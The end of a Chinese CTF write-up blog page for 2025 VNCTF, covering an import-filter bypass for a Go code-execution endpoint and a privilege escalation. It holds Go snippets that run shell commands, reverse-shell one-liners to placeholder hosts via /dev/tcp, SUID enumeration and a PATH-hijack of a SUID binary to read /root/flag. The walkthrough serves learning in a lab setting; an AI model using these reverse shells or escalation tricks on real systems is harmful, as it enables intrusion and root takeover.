+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212205348623.png"
+	width="1717"
+	height="452"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212205348623_hu2259454330397204109.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212205348623_hu692400835787318401.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250212205348623"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="379"
+		data-flex-basis="911px"
+	
+></p>
+<p>拿到key之后就是伪造jwt了</p>
+<p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212211950928.png"
+	width="1555"
+	height="715"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212211950928_hu4207921198003121988.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212211950928_hu4519160101339643118.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250212211950928"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="521px"
+	
+></p>
+<p>现在就可以在/admin路由执行go代码了。但是有过滤</p>
+<p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212213550374.png"
+	width="728"
+	height="300"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212213550374_hu2916512700379261146.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212213550374_hu3780227580226481541.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250212213550374"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="582px"
+	
+></p>
+<p>这里有很多绕过方式，因为只匹配第一个import，可以把os/exec放到第二个import里面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;os/exec&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">cmd</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s">&#34;-c&#34;</span><span class="p">,</span> <span class="s">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">cmd</span><span class="p">.</span><span class="nf">CombinedOutput</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不能有os/exec，可以用syscall来代替。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;syscall&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">syscall</span><span class="p">.</span><span class="nf">Exec</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;sh&#34;</span><span class="p">,</span> <span class="s">&#34;-c&#34;</span><span class="p">,</span> <span class="s">&#34;whoami&#34;</span><span class="p">},</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者用goeval</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/PaulXu-cn/goeval&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span>  <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">	<span class="nx">cmd</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">goeval</span><span class="p">.</span><span class="nf">Eval</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;cmd:=exec.Command(\&#34;bash\&#34;,\&#34;-c\&#34;,\&#34;exec bash -i &amp;&gt;/dev/tcp/ip/7777 &lt;&amp;1\&#34;);out,_:=cmd.CombinedOutput();fmt.Println(string(out))&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;os/exec&#34;</span><span class="p">,</span> <span class="s">&#34;fmt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">cmd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash -c &#39;bash -i &gt;&amp; /dev/tcp/XXXX/2333 &lt;&amp;1&#39;
+</span></span><span class="line"><span class="cl">nc -lnvp 2333
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于没有vps，直接在bp命令执行了</p>
+<p>ls /查看到flag，但是是假的,suid提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212224649177.png"
+	width="1850"
+	height="495"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212224649177_hu13581938676598541718.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212224649177_hu12520777228122957073.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250212224649177"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="373"
+		data-flex-basis="896px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/su
+</span></span><span class="line"><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/.../Cat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个cat非常可疑</p>
+<p>这里是用的<code>cat /flag</code>而不是<code>/bin/cat /flag</code>,可以环境变量胁持，接着就是环境变量提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">echo</span> <span class="s1">&#39;/bin/bash&#39;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cat</span>
+</span></span><span class="line"><span class="cl"><span class="n">chmod</span> <span class="mi">777</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cat</span>
+</span></span><span class="line"><span class="cl"><span class="k">export</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">tmp</span><span class="p">:</span><span class="o">$</span><span class="n">PATH</span>
+</span></span><span class="line"><span class="cl"><span class="o">/.../</span><span class="n">Cat</span>
+</span></span><span class="line"><span class="cl"><span class="err">最后</span><span class="n">tac</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里记得不要用 cat，我们修改了环境变量 cat 已经是/bin/bash 了。</p>
+<p>而没弹shell是用不了bash来改环境变量的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">echo</span> <span class="s1">&#39;tac /root/flag&#39;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cat</span><span class="p">;</span><span class="n">chmod</span> <span class="mi">777</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cat</span><span class="p">;</span><span class="k">export</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">tmp</span><span class="p">:</span><span class="o">$</span><span class="n">PATH</span><span class="o">&amp;&amp;/.../</span><span class="n">Cat</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212231800700.png"
+	width="1844"
+	height="507"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212231800700_hu11708762810711531047.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212231800700_hu9467527364915455533.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250212231800700"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="363"
+		data-flex-basis="872px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/2025dasctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025dasctfwp/1.2feb0258814dd14d6c19f8ab8c222dba.png" 
+                        width="1216" 
+                        height="832" 
+                        loading="lazy"
+                        alt="Featured image of post 2025DASCTFwp"
+                        
+                        data-hash="md5-L&#43;sCWIFN0U1sGfirjCItug==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025DASCTFwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025%E9%B8%BF%E8%92%99ctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/1.c8aaeee35cdbe64a0386c10f2226a200.jpg" 
+                        width="1152" 
+                        height="896" 
+                        loading="lazy"
+                        alt="Featured image of post 2025鸿蒙ctfwp"
+                        
+                        data-hash="md5-yKru41zb5koDhsEPIiaiAA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025鸿蒙ctfwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025d3ctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025d3ctf%E5%A4%8D%E7%8E%B0/1.4b0e18f0797c9c902f99f705eb5e74cb.jpg" 
+                        width="1024" 
+                        height="1024" 
+                        loading="lazy"
+                        alt="Featured image of post 2025D^3CTF复现"
+                        
+                        data-hash="md5-Sw4Y8Hl8nJAvmfcF6150yw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025D^3CTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025minilctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/1.png" loading="lazy" data-key="" data-hash="/1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025MiniLCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025tgctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025tgctf%E5%A4%8D%E7%8E%B0/1.8a72782d13ca5196f24890ce1e021ab3.png" 
+                        width="1440" 
+                        height="1200" 
+                        loading="lazy"
+                        alt="Featured image of post 2025TGCTF复现"
+                        
+                        data-hash="md5-inJ4LRPKUZbySJDOHgIasw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025TGCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
